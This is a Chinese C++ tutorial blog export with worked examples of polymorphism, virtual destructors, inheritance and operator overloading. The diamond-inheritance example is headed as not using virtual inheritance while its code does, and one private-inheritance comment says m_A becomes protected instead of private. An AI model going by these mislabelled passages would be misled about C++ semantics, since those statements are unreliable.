12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//多态案例2 制作饮品class AbstractDrinking&#123;public: //煮水 virtual void Boil() = 0; //冲泡 virtual void Brew() = 0; //倒入杯中 virtual void PourInCup() = 0; //加入辅料 virtual void PutSomething() = 0; //制作饮品 void makeDrink() &#123; Boil(); Brew(); PourInCup(); PutSomething(); &#125;&#125;;//制作咖啡class Coffee :public AbstractDrinking&#123;public: //煮水 virtual void Boil() &#123; cout &lt;&lt; &quot;煮农夫山泉&quot; &lt;&lt; endl; &#125; //冲泡 virtual void Brew() &#123; cout &lt;&lt; &quot;冲泡咖啡&quot; &lt;&lt; endl; &#125; //倒入杯中 virtual void PourInCup() &#123; cout &lt;&lt; &quot;倒入杯中&quot; &lt;&lt; endl; &#125; //加入辅料 virtual void PutSomething() &#123; cout &lt;&lt; &quot;加入糖和牛奶&quot; &lt;&lt; endl; &#125;&#125;;//制作茶class Tea :public AbstractDrinking&#123;public: //煮水 virtual void Boil() &#123; cout &lt;&lt; &quot;煮矿泉水&quot; &lt;&lt; endl; &#125; //冲泡 virtual void Brew() &#123; cout &lt;&lt; &quot;冲泡茶叶&quot; &lt;&lt; endl; &#125; //倒入杯中 virtual void PourInCup() &#123; cout &lt;&lt; &quot;倒入杯中&quot; &lt;&lt; endl; &#125; //加入辅料 virtual void PutSomething() &#123; cout &lt;&lt; &quot;加入枸杞&quot; &lt;&lt; endl; &#125;&#125;;//制作函数void doWork(AbstractDrinking* abs)&#123; abs-&gt;makeDrink(); delete abs;//释放&#125;void test01()&#123; //制作咖啡 doWork(new Coffee); cout &lt;&lt; &quot;----------------------&quot; &lt;&lt; endl; //制作茶叶 doWork(new Tea);&#125;int main()&#123; test01();&#125; 运行结果为： 煮农夫山泉冲泡咖啡倒入杯中加入糖和牛奶 煮矿泉水冲泡茶叶倒入杯中加入枸杞 虚析构和纯虚析构多态使用时，如果子类中有属性开辟到堆区，那么父类指针在释放时无法调用到子类的析构代码 解决方式：将父类中的析构函数改为虚析构或者纯虚析构 虚析构和纯虚析构共性： 可以解决父类指针释放子类对象 都需要有具体的函数实现 虚析构和纯虚析构区别 如果是纯虚析构，该类属于抽象类，无法实例化对象 虚析构语法： virtual ~类名()&#123;&#125; 纯虚析构语法： virtual ~类名() = 0 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//虚析构函数和纯虚析构函数class Animal&#123;public: //纯虚函数 Animal() &#123; cout &lt;&lt; &quot;Animal的构造函数调用&quot; &lt;&lt; endl; &#125; ~Animal() &#123; cout &lt;&lt; &quot;Animal的析构函数调用&quot; &lt;&lt; endl; &#125; virtual void speak() = 0;&#125;;class Cat :public Animal&#123;public: Cat(string name) &#123; cout &lt;&lt; &quot;Cat的构造函数调用&quot; &lt;&lt; endl; m_Name = new string(name); &#125; virtual void speak() &#123; cout &lt;&lt; *m_Name &lt;&lt; &quot;小猫在说话&quot; &lt;&lt; endl; &#125; ~Cat() &#123; if (m_Name != NULL) &#123; cout &lt;&lt; &quot;Cat的析构函数调用&quot; &lt;&lt; endl; delete m_Name; m_Name = NULL; &#125; &#125; string *m_Name;&#125;;void test01()&#123; Animal* animal = new Cat(&quot;Tom&quot;); animal-&gt;speak(); //父类指针在析构时，不会调用子类中的析构函数，导致如果子类有堆区属性，会导致内存泄漏 delete animal;&#125;int main()&#123; test01();&#125; 运行结果为： Animal的构造函数调用Cat的构造函数调用Tom小猫在说话Animal的析构函数调用 父类指针在析构时，不会调用子类中的析构函数，导致如果子类有堆区属性，会导致内存泄漏 我们使用虚析构解决这个问题 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//虚析构函数和纯虚析构函数class Animal&#123;public: //纯虚函数 Animal() &#123; cout &lt;&lt; &quot;Animal的构造函数调用&quot; &lt;&lt; endl; &#125; //可以利用虚析构解决父类指针释放子类对象时不干净的问题 virtual ~Animal() &#123; cout &lt;&lt; &quot;Animal的析构函数调用&quot; &lt;&lt; endl; &#125; virtual void speak() = 0;&#125;;class Cat :public Animal&#123;public: Cat(string name) &#123; cout &lt;&lt; &quot;Cat的构造函数调用&quot; &lt;&lt; endl; m_Name = new string(name); &#125; virtual void speak() &#123; cout &lt;&lt; *m_Name &lt;&lt; &quot;小猫在说话&quot; &lt;&lt; endl; &#125; ~Cat() &#123; if (m_Name != NULL) &#123; cout &lt;&lt; &quot;Cat的析构函数调用&quot; &lt;&lt; endl; delete m_Name; m_Name = NULL; &#125; &#125; string *m_Name;&#125;;void test01()&#123; Animal* animal = new Cat(&quot;Tom&quot;); animal-&gt;speak(); //父类指针在析构时，不会调用子类中的析构函数，导致如果子类有堆区属性，会导致内存泄漏 delete animal;&#125;int main()&#123; test01();&#125; 运行结果为： Animal的构造函数调用Cat的构造函数调用Tom小猫在说话Cat的析构函数调用Animal的析构函数调用 我们使用纯虚析构解决这个问题 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//虚析构函数和纯虚析构函数class Animal&#123;public: //纯虚函数 Animal() &#123; cout &lt;&lt; &quot;Animal的构造函数调用&quot; &lt;&lt; endl; &#125; //可以利用纯虚析构解决父类指针释放子类对象时不干净的问题 //有了纯虚析构之后，这个类也属于抽象类，无法实例化对象 virtual ~Animal() = 0; virtual void speak() = 0;&#125;;Animal::~Animal()&#123; cout &lt;&lt; &quot;Animal的纯虚析构函数调用&quot; &lt;&lt; endl;&#125;class Cat :public Animal&#123;public: Cat(string name) &#123; cout &lt;&lt; &quot;Cat的构造函数调用&quot; &lt;&lt; endl; m_Name = new string(name); &#125; virtual void speak() &#123; cout &lt;&lt; *m_Name &lt;&lt; &quot;小猫在说话&quot; &lt;&lt; endl; &#125; ~Cat() &#123; if (m_Name != NULL) &#123; cout &lt;&lt; &quot;Cat的析构函数调用&quot; &lt;&lt; endl; delete m_Name; m_Name = NULL; &#125; &#125; string *m_Name;&#125;;void test01()&#123; Animal* animal = new Cat(&quot;Tom&quot;); animal-&gt;speak(); //父类指针在析构时，不会调用子类中的析构函数，导致如果子类有堆区属性，会导致内存泄漏 delete animal;&#125;int main()&#123; test01();&#125; 运行结果为： Animal的构造函数调用Cat的构造函数调用Tom小猫在说话Cat的析构函数调用Animal的纯虚析构函数调用 多态案例三 电脑组装案例描述： 电脑主要组成部件为CPU（用于计算），显卡（用于显示），内存条（用于存储） 将每个零件封装出抽象基类，并且提供不同的厂商生产不同的零件，例如Intel厂商喝Lenovo厂商 创建电脑类提供让电脑工作的函数，并且调用每个零件工作的接口 测试时组装三台不同的电脑进行工作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//抽象不同的类//抽象CPU类class CPU&#123;public: //抽象的计算函数 virtual void calculate() = 0;&#125;;//抽象内存类class Memory&#123;public: //抽象的存储函数 virtual void storage() = 0;&#125;;//抽象显卡类class VideoCard&#123;public: virtual void display() = 0;&#125;;//抽象电脑类class Computer&#123;public: Computer(CPU* cpu, VideoCard* vc, Memory* mem) &#123; m_cpu = cpu; m_vc = vc; m_mem = mem; &#125; //提供工作的函数 void work() &#123; //让零件工作起来，调用接口 m_cpu-&gt;calculate(); m_vc-&gt;display(); m_mem-&gt;storage(); &#125; //提供析构函数 释放三个电脑零件 ~Computer() &#123; if (m_cpu != NULL) &#123; delete m_cpu; m_cpu = NULL; &#125; if (m_vc != NULL) &#123; delete m_vc; m_vc = NULL; &#125; if (m_mem != NULL) &#123; delete m_mem; m_mem = NULL; &#125; &#125;private: CPU* m_cpu;//CPU的零件指针 VideoCard* m_vc;//显卡的零件指针 Memory* m_mem;//内存的零件指针&#125;;//具体厂商//Intel厂商class IntelCPU :public CPU&#123;public: virtual void calculate() &#123; cout &lt;&lt; &quot;Intel的CPU开始计算了！&quot; &lt;&lt; endl; &#125;&#125;;class IntelVideoCard :public VideoCard&#123;public: virtual void display() &#123; cout &lt;&lt; &quot;Intel的显卡开始显示了！&quot; &lt;&lt; endl; &#125;&#125;;class IntelMemory :public Memory&#123;public: virtual void storage() &#123; cout &lt;&lt; &quot;Intel的内存条开始存储了！&quot; &lt;&lt; endl; &#125;&#125;;//AMD厂商class AMDCPU :public CPU&#123;public: virtual void calculate() &#123; cout &lt;&lt; &quot;AMD的CPU开始计算了！&quot; &lt;&lt; endl; &#125;&#125;;class AMDVideoCard :public VideoCard&#123;public: virtual void display() &#123; cout &lt;&lt; &quot;AMD的显卡开始显示了！&quot; &lt;&lt; endl; &#125;&#125;;class AMDMemory :public Memory&#123;public: virtual void storage() &#123; cout &lt;&lt; &quot;AMD的内存条开始存储了！&quot; &lt;&lt; endl; &#125;&#125;;void test01()&#123; //第一台电脑零件 CPU* intelCpu = new IntelCPU; VideoCard* intelCard = new IntelVideoCard; Memory* intelMem = new IntelMemory; //创建第一台电脑 cout &lt;&lt; &quot;第一台电脑开始工作&quot; &lt;&lt; endl; Computer* computer1 = new Computer(intelCpu,intelCard,intelMem); computer1-&gt;work(); delete computer1; //创建第二台电脑 cout &lt;&lt; &quot;----------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;第二台电脑开始工作：&quot; &lt;&lt; endl; Computer* computer2 = new Computer(new AMDCPU, new AMDVideoCard, new AMDMemory); computer2-&gt;work(); delete computer2; //创建第三台电脑 cout &lt;&lt; &quot;----------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;第三台电脑开始工作：&quot; &lt;&lt; endl; Computer* computer3 = new Computer(new IntelCPU, new AMDVideoCard, new IntelMemory); computer3-&gt;work(); delete computer3;&#125;int main()&#123; test01();&#125; 运行结果为： 第一台电脑开始工作Intel的CPU开始计算了！Intel的显卡开始显示了！Intel的内存条开始存储了！ 第二台电脑开始工作：AMD的CPU开始计算了！AMD的显卡开始显示了！AMD的内存条开始存储了！ 第三台电脑开始工作：Intel的CPU开始计算了！AMD的显卡开始显示了！Intel的内存条开始存储了！","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"C++学习 继承","slug":"C++-学习-继承","date":"2023-05-02T01:22:05.000Z","updated":"2023-05-09T08:11:01.440Z","comments":true,"path":"2023/05/02/C++-学习-继承/","link":"","permalink":"http://example.com/2023/05/02/C++-%E5%AD%A6%E4%B9%A0-%E7%BB%A7%E6%89%BF/","excerpt":"继承是面向对象三大特性之一 有些类与类之间存在特殊的关系，定义这些类时，下级别的成员除了拥有上一级的共性还有自己的特性，这个时候我们可以考虑利用继承的技术减少重复代码。 继承的基本语法","text":"继承是面向对象三大特性之一 有些类与类之间存在特殊的关系，定义这些类时，下级别的成员除了拥有上一级的共性还有自己的特性，这个时候我们可以考虑利用继承的技术减少重复代码。 继承的基本语法语法： class 子类：继承方式 父类 子类也成为派生类，父类也成为基类 例如我们看到很多网站中，都有公共的头部，公共的底部，甚至公共的左侧列表，只有中心内容不同，接下来我们分别利用普通写法和继承的写法来实现网页中的内容，看一下继承存在的意义以及好处 普通实现如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//普通实现页面//Java页面class Java&#123;public: void header() &#123; cout &lt;&lt; &quot;首页、公开课、登录、注册...（公共头部）&quot; &lt;&lt; endl; &#125; void footer() &#123; cout &lt;&lt; &quot;帮助中心、交流合作、站内地图...（公共底部)&quot; &lt;&lt; endl; &#125; void left() &#123; cout &lt;&lt; &quot;Java、Python、C++...（公共分类列表&quot; &lt;&lt; endl; &#125; void content() &#123; cout &lt;&lt; &quot;Java学科视频&quot; &lt;&lt; endl; &#125;&#125;;//Python页面class Python&#123;public: void header() &#123; cout &lt;&lt; &quot;首页、公开课、登录、注册...（公共头部）&quot; &lt;&lt; endl; &#125; void footer() &#123; cout &lt;&lt; &quot;帮助中心、交流合作、站内地图...（公共底部)&quot; &lt;&lt; endl; &#125; void left() &#123; cout &lt;&lt; &quot;Java、Python、C++...（公共分类列表&quot; &lt;&lt; endl; &#125; void content() &#123; cout &lt;&lt; &quot;Python学科视频&quot; &lt;&lt; endl; &#125;&#125;;//C++页面class Cpp&#123;public: void header() &#123; cout &lt;&lt; &quot;首页、公开课、登录、注册...（公共头部）&quot; &lt;&lt; endl; &#125; void footer() &#123; cout &lt;&lt; &quot;帮助中心、交流合作、站内地图...（公共底部)&quot; &lt;&lt; endl; &#125; void left() &#123; cout &lt;&lt; &quot;Java、Python、C++...（公共分类列表&quot; &lt;&lt; endl; &#125; void content() &#123; cout &lt;&lt; &quot;C++学科视频&quot; &lt;&lt; endl; &#125;&#125;;void test01()&#123; cout &lt;&lt; &quot;Java页面如下&quot; &lt;&lt; endl; Java ja; ja.header(); ja.footer(); ja.left(); ja.content(); cout &lt;&lt; &quot;------------------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;Python页面如下&quot; &lt;&lt; endl; Python py; py.header(); py.footer(); py.left(); py.content(); cout &lt;&lt; &quot;------------------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;C++页面如下&quot; &lt;&lt; endl; Cpp cpp; cpp.header(); cpp.footer(); cpp.left(); cpp.content();&#125;int main()&#123; test01();&#125; 运行结果为： Java页面如下首页、公开课、登录、注册…（公共头部）帮助中心、交流合作、站内地图…（公共底部)Java、Python、C++…（公共分类列表Java学科视频 Python页面如下首页、公开课、登录、注册…（公共头部）帮助中心、交流合作、站内地图…（公共底部)Java、Python、C++…（公共分类列表Python学科视频 C++页面如下首页、公开课、登录、注册…（公共头部）帮助中心、交流合作、站内地图…（公共底部)Java、Python、C++…（公共分类列表C++学科视频 继承实现如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//继承实现页面//公共页面类class Basepage&#123;public: void header() &#123; cout &lt;&lt; &quot;首页、公开课、登录、注册...（公共头部）&quot; &lt;&lt; endl; &#125; void footer() &#123; cout &lt;&lt; &quot;帮助中心、交流合作、站内地图...（公共底部)&quot; &lt;&lt; endl; &#125; void left() &#123; cout &lt;&lt; &quot;Java、Python、C++...（公共分类列表&quot; &lt;&lt; endl; &#125;&#125;;//Java页面class Java : public Basepage&#123;public: void content() &#123; cout &lt;&lt; &quot;Java学科视频&quot; &lt;&lt; endl; &#125;&#125;;//Python页面class Python : public Basepage&#123;public: void content() &#123; cout &lt;&lt; &quot;Python学科视频&quot; &lt;&lt; endl; &#125;&#125;;//C++页面class Cpp : public Basepage&#123;public: void content() &#123; cout &lt;&lt; &quot;C++学科视频&quot; &lt;&lt; endl; &#125;&#125;;void test01()&#123; cout &lt;&lt; &quot;Java页面如下&quot; &lt;&lt; endl; Java ja; ja.header(); ja.footer(); ja.left(); ja.content(); cout &lt;&lt; &quot;------------------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;Python页面如下&quot; &lt;&lt; endl; Python py; py.header(); py.footer(); py.left(); py.content(); cout &lt;&lt; &quot;------------------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;C++页面如下&quot; &lt;&lt; endl; Cpp cpp; cpp.header(); cpp.footer(); cpp.left(); cpp.content();&#125;int main()&#123; test01();&#125; 运行结果为： Java页面如下首页、公开课、登录、注册…（公共头部）帮助中心、交流合作、站内地图…（公共底部)Java、Python、C++…（公共分类列表Java学科视频 Python页面如下首页、公开课、登录、注册…（公共头部）帮助中心、交流合作、站内地图…（公共底部)Java、Python、C++…（公共分类列表Python学科视频 C++页面如下首页、公开课、登录、注册…（公共头部）帮助中心、交流合作、站内地图…（公共底部)Java、Python、C++…（公共分类列表C++学科视频 继承方式继承的方式一共有三种 公共继承 保护继承 私有继承 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//继承方式class Base&#123;public: int m_A;protected: int m_B;private: int m_C;&#125;;class Son1 :public Base&#123;public: void func() &#123; m_A = 10;//父类中的公共权限成员到子类中依然是公共权限 m_B = 10;//父类中的保护权限成员到子类中依然是保护权限 //m_C = 10;//父类中的私有权限成员子类访问不到 &#125;&#125;;void test01()&#123; Son1 s1; s1.m_A = 100; //s1.m_B = 100;//到Son1中m_B是保护权限，类外访问不到&#125;//保护继承class Son2 :protected Base&#123;public: void func() &#123; m_A = 100;//父类中的公共权限成员到子类中变为保护权限 m_B = 100;//父类中的保护权限成员到子类中依然是保护权限 //m_C = 100;//父类中私有权限成员子类访问不到 &#125;&#125;;void test02()&#123; Son2 s1; //s1.m_A = 10;//在Son2中 m_A变为保护权限，因此类外访问不到 //s1.m_B = 10;//在Son2中 m_B变为保护权限，不可以访问&#125;class Son3 :private Base&#123;public: void func() &#123; m_A = 100;//父类中的公共权限成员到子类中变为保护权限 m_B = 100;//父类中的保护权限成员到子类中变为私有权限 //m_C = 100;//父类中的私有成员子类访问不到 &#125;&#125;;void test03()&#123; Son3 s1; //s1.m_A = 10;//到Son3中变为私有成员，类外访问不了 //s1.m_B = 10;//到Son3中变为私有成员，类外访问不了&#125;int main()&#123; test01(); test02(); test03();&#125; 继承中的对象模型问题：从父类继承过来的成员，哪些属于子类对象中 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//继承中的对象模型class Base&#123;public: int m_A;protected: int m_B;private: int m_C;&#125;;class Son :public Base&#123;public: int m_D;&#125;;void test01()&#123; cout &lt;&lt; &quot;size of Son = &quot; &lt;&lt; sizeof(Son) &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： size of Son &#x3D; 16 父类中所有非静态成员属性都会被子类继承下去 父类中私有成员属性是被编译器给隐藏了，因此是访问不到，但是确实是被继承下去了 开发人员命令提示工具查看对象模型打开vs开发人员命令提示工具 转到文件对应的路径 输入命令查看类 1cl /d1 reportSingleClassLayout类名 文件名 继承中构造和析构顺序子类继承父类后，当创建子类对象，也会调用父类的构造函数 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//继承中的构造和析构顺序class Base&#123;public: Base() &#123; cout &lt;&lt; &quot;Base的构造函数！&quot; &lt;&lt; endl; &#125; ~Base() &#123; cout &lt;&lt; &quot;Base的析构函数！&quot; &lt;&lt; endl; &#125;&#125;;class Son :public Base&#123;public: Son() &#123; cout &lt;&lt; &quot;Son的构造函数！&quot; &lt;&lt; endl; &#125; ~Son() &#123; cout &lt;&lt; &quot;Son的析构函数！&quot; &lt;&lt; endl; &#125;&#125;;void test01()&#123; Son s;&#125;int main()&#123; test01();&#125; 运行结果为： Base的构造函数！Son的构造函数！Son的析构函数！Base的析构函数！ 先构造父类再构造子类，析构相反 继承同名成员处理方式访问子类同名成员，直接访问即可 访问父类同名成员，需要加作用域 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Base&#123;public: Base() &#123; m_A = 100; &#125; void func() &#123; cout &lt;&lt; &quot;Base - func()调用&quot; &lt;&lt; endl; &#125; void func(int a) &#123; cout &lt;&lt; &quot;Base - func(int a)调用&quot; &lt;&lt; endl; &#125; int m_A;&#125;;class Son :public Base&#123;public: Son() &#123; m_A = 200; &#125; void func() &#123; cout &lt;&lt; &quot;Son - func()调用&quot; &lt;&lt; endl; &#125; int m_A;&#125;;//同名成员属性void test01()&#123; Son s; cout &lt;&lt; &quot;Son下的m_A = &quot; &lt;&lt; s.m_A &lt;&lt; endl; //如果通过子类对象，访问到父类中的同名成员，需要加作用域 cout &lt;&lt; &quot;Base下的m_A = &quot; &lt;&lt; s.Base::m_A &lt;&lt; endl;&#125;//同名成员函数处理void test02()&#123; Son s; s.func();//直接调用的是子类中的同名成员 s.Base::func(); //如果子类中出现和父类同名的成员函数，子类的同名成员会隐藏掉父类中所有的同名成员函数 s.Base::func(100);&#125;int main()&#123; test01(); test02();&#125; 运行结果为： Son下的m_A &#x3D; 200Base下的m_A &#x3D; 100Son - func()调用Base - func()调用Base - func(int a)调用 继承同名静态成员处理方式静态成员和非静态成员同名，处理方式一致 访问子类同名成员，直接访问即可 访问父类同名成员，需要加作用域 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//继承中的同名静态成员的处理方式class Base&#123;public: static int m_A; static void func() &#123; cout &lt;&lt; &quot;Base - static void func()调用&quot; &lt;&lt; endl; &#125; static void func(int a) &#123; cout &lt;&lt; &quot;Base - static void func(int a)调用&quot; &lt;&lt; endl; &#125;&#125;;int Base::m_A = 100;class Son :public Base&#123;public: static int m_A; static void func() &#123; cout &lt;&lt; &quot;Son - static void func()调用&quot; &lt;&lt; endl; &#125;&#125;;int Son::m_A = 200;//同名静态成员属性void test01()&#123; //1、通过对象访问 cout &lt;&lt; &quot;通过对象访问：&quot; &lt;&lt; endl; Son s; cout &lt;&lt; &quot;Son下的m_A = &quot; &lt;&lt; s.m_A &lt;&lt; endl; cout &lt;&lt; &quot;Base下的m_A = &quot; &lt;&lt; s.Base::m_A &lt;&lt; endl; //2、通过类名访问 cout &lt;&lt; &quot;通过类名访问：&quot; &lt;&lt; endl; cout &lt;&lt; &quot;Son下的m_A = &quot; &lt;&lt; Son::m_A &lt;&lt; endl; cout &lt;&lt; &quot;Base下的m_A = &quot; &lt;&lt; Son::Base::m_A &lt;&lt; endl;//第一个::代表通过类名方式访问，第二个::代表访问父类作用域&#125;//同名静态成员函数void test02()&#123; //1、通过对象访问 cout &lt;&lt; &quot;通过对象访问：&quot; &lt;&lt; endl; Son s; s.func(); s.Base::func(); //2、通过类名访问 cout &lt;&lt; &quot;通过类名访问：&quot; &lt;&lt; endl; Son::func(); Son::Base::func(); //子类出现和父类同名静态成员函数，也会隐藏父类中所有的同名成员函数 //如果想访问父类中被隐藏同名成员，需要加作用域 Son::Base::func(100);&#125;int main()&#123; test01(); test02();&#125; 运行结果为： 通过对象访问：Son下的m_A &#x3D; 200Base下的m_A &#x3D; 100通过类名访问：Son下的m_A &#x3D; 200Base下的m_A &#x3D; 100通过对象访问：Son - static void func()调用Base - static void func()调用通过类名访问：Son - static void func()调用Base - static void func()调用Base - static void func(int a)调用 多继承语法C++允许一个类继承多个类 语法：class 子类：继承方式 父类1，继承方式 父类2 ... 多继承可能会引发父类中有同名成员出现，需要加作用域区分 C++实际开发中不建议使用多继承 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//多继承语法class Base1&#123;public: Base1() &#123; m_A = 100; &#125; int m_A;&#125;;class Base2&#123;public: Base2() &#123; m_A = 200; &#125; int m_A;&#125;;class Son :public Base1, public Base2&#123;public: Son() &#123; m_C = 300; m_D = 400; &#125; int m_C; int m_D;&#125;;void test01()&#123; Son s; cout &lt;&lt; &quot;size of Son = &quot; &lt;&lt; sizeof(s) &lt;&lt; endl; cout &lt;&lt; &quot;Base1::m_A = &quot; &lt;&lt; s.Base1::m_A &lt;&lt; endl; cout &lt;&lt; &quot;Base2::m_A = &quot; &lt;&lt; s.Base2::m_A &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： size of Son &#x3D; 16Base1::m_A &#x3D; 100Base2::m_A &#x3D; 200 菱形继承菱形继承概念： 两个派生类继承同一个基类 又有某个类同时继承两个派生类 这种继承被称为菱形继承或钻石继承 不使用虚继承 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//动物类class Animal&#123;public: int m_Age;&#125;;//利用虚继承解决菱形继承的问题//继承之前加上关键字virtual变为虚继承//Animal类称为虚基类 //羊类class Sheep :virtual public Animal &#123;&#125;;//驼类class Tuo :virtual public Animal&#123;&#125;;//羊驼类class SheepTuo :public Sheep, public Tuo&#123;&#125;;void test01()&#123; SheepTuo st; st.Sheep::m_Age = 18; st.Tuo::m_Age = 28; //当菱形继承，两个父类拥有相同数据，需要加以作用域区分 cout &lt;&lt; &quot;st.Sheep::m_Age = &quot; &lt;&lt; st.Sheep::m_Age &lt;&lt; endl; cout &lt;&lt; &quot;st.Tuo::m_Age = &quot; &lt;&lt; st.Tuo::m_Age &lt;&lt; endl; //这份数据我们知道 只要有一份就可以，菱形继承导致数据有两份，资源浪费&#125;int main()&#123; test01();&#125; 运行结果为： st.Sheep::m_Age &#x3D; 28st.Tuo::m_Age &#x3D; 28","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"C++学习 运算符重载","slug":"C++-学习-运算符重载","date":"2023-04-30T07:57:41.000Z","updated":"2023-05-14T06:33:48.634Z","comments":true,"path":"2023/04/30/C++-学习-运算符重载/","link":"","permalink":"http://example.com/2023/04/30/C++-%E5%AD%A6%E4%B9%A0-%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD/","excerpt":"运算符重载概念：对已有的运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型 加号运算符重载作用：实现两个自定义数据类型相加的运算","text":"运算符重载概念：对已有的运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型 加号运算符重载作用：实现两个自定义数据类型相加的运算 成员函数重载123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;string&gt;//加号运算符重载using namespace std;class Person&#123;public: Person operator+ (Person&amp; p) &#123; Person temp; temp.m_A = this-&gt;m_A + p.m_A; temp.m_B = this-&gt;m_B + p.m_B; return temp; &#125; int m_A; int m_B;&#125;;void test01()&#123; Person p1; p1.m_A = 10; p1.m_B = 10; Person p2; p2.m_A = 20; p2.m_B = 20; Person p3 = p1 + p2; cout &lt;&lt; &quot;p3.m_A = &quot; &lt;&lt; p3.m_A &lt;&lt; endl; cout &lt;&lt; &quot;p3.m_B = &quot; &lt;&lt; p3.m_B &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： p3.m_A &#x3D; 30p3.m_B &#x3D; 30 成员函数重载本质调用 1Person p3 = p1.operator+(p2); 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//全局函数重载class Person&#123;public: int m_A; int m_B;&#125;;Person operator+ (Person&amp; p1, Person&amp; p2)&#123; Person temp; temp.m_A = p1.m_A + p2.m_A; temp.m_B = p1.m_B + p2.m_B; return temp;&#125;void test01()&#123; Person p1; p1.m_A = 10; p1.m_B = 10; Person p2; p2.m_A = 20; p2.m_B = 20; Person p3 = p1 + p2; cout &lt;&lt; &quot;p3.m_A = &quot; &lt;&lt; p3.m_A &lt;&lt; endl; cout &lt;&lt; &quot;p3.m_B = &quot; &lt;&lt; p3.m_B &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： p3.m_A &#x3D; 30p3.m_B &#x3D; 30 全局函数重载本质调用 1Person p3 = operator+(p1,p2); 运算符重载也可以函数重载12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//全局函数重载class Person&#123;public: int m_A; int m_B;&#125;;Person operator+ (Person&amp; p1,int num)&#123; Person temp; temp.m_A = p1.m_A + num; temp.m_B = p1.m_B + num; return temp;&#125;void test01()&#123; Person p1; p1.m_A = 10; p1.m_B = 10; Person p3 = p1 + 10; cout &lt;&lt; &quot;p3.m_A = &quot; &lt;&lt; p3.m_A &lt;&lt; endl; cout &lt;&lt; &quot;p3.m_B = &quot; &lt;&lt; p3.m_B &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： p3.m_A &#x3D; 20p3.m_B &#x3D; 20 左移运算符重载作用：可以输出自定义的数据类型 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//左移运算符重载class Person&#123;public: //利用成员函数重载左移运算符&lt;&lt; //通常不会利用成员函数重载&lt;&lt;，因为不能实现cout在左侧 int m_A; int m_B;&#125;;ostream &amp; operator&lt;&lt;(ostream&amp; cout, Person&amp; p)&#123; cout &lt;&lt; &quot;m_A = &quot; &lt;&lt; p.m_A &lt;&lt; &quot; m_B = &quot; &lt;&lt; p.m_B; return cout;&#125;void test01()&#123; Person p; p.m_A = 10; p.m_B = 10; cout &lt;&lt; p &lt;&lt;endl;&#125;int main()&#123; test01();&#125; 运行结果为： m_A &#x3D; 10 m_B &#x3D; 10 